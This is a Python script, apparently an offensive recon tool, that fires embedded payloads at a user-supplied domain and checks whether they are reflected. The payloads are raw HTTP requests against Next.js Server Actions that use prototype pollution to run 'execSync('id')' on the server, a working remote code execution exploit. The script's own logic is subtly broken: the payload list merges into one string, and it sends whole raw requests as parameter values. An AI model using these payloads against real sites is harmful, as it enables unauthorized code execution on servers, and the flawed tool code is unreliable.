#!/usr/bin/env python3
import requests
from prettytable import PrettyTable
from colorama import Fore, Style, init

init(autoreset=True)

# ================= CONFIG =================
TIMEOUT = 10

PAYLOADS = [
      """POST / HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
Next-Action: x
X-Nextjs-Request-Id: b5dce965
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
Content-Length: 740

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}",
  "_response": {
    "_prefix": "var res=process.mainModule.require('child_process').execSync('id',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:`${res}`});",
    "_chunks": "$Q2",
    "_formData": {
      "get": "$1:constructor:constructor"
    }
  }
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
",
"POST / HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Next-Action: x
X-Nextjs-Request-Id: b5dce965
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
Content-Length: 689

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('id').toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT\_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"

[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--"""]

HEADERS = {
    "User-Agent": "Mozilla/5.0 EagleRecon-PayloadTester"
}

# ================= HELPERS =================
def table(headers):
    t = PrettyTable(headers)
    t.align = "l"
    return t

# ================= PAYLOAD TEST =================
def test_payloads(target):
    print(f"\n{Fore.YELLOW}🦅 PAYLOAD TESTING{Style.RESET_ALL}")

    tested = table(["#", "Method", "Payload", "Reflected"])
    found  = table(["Method", "Payload", "Evidence"])

    base = f"https://{target.strip('/')}/"
    i = 1

    for payload in PAYLOADS:
        for method in ["GET", "POST"]:
            try:
                if method == "GET":
                    r = requests.get(
                        base,
                        params={"test": payload},
                        headers=HEADERS,
                        timeout=TIMEOUT
                    )
                else:
                    r = requests.post(
                        base,
                        data={"test": payload},
                        headers=HEADERS,
                        timeout=TIMEOUT
                    )

                reflected = payload in r.text

                tested.add_row([
                    i,
                    method,
                    payload[:40] + ("..." if len(payload) > 40 else ""),
                    Fore.GREEN + "YES" if reflected else Fore.WHITE + "NO"
                ])

                if reflected:
                    found.add_row([
                        Fore.GREEN + method,
                        payload,
                        Fore.CYAN + "Reflected in response body"
                    ])

                i += 1

            except Exception as e:
                tested.add_row([i, method, payload[:30], Fore.RED + "ERROR"])
                i += 1

    print(tested)

    if found.rowcount > 0:
        print(f"\n{Fore.GREEN}✅ FOUND PAYLOADS{Style.RESET_ALL}")
        print(found)
    else:
        print(f"\n{Fore.RED}❌ NO PAYLOAD REFLECTED{Style.RESET_ALL}")

# ================= MAIN =================
if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python3 payload_tester.py example.com")
        sys.exit(1)

    target = sys.argv[1]
    test_payloads(target)
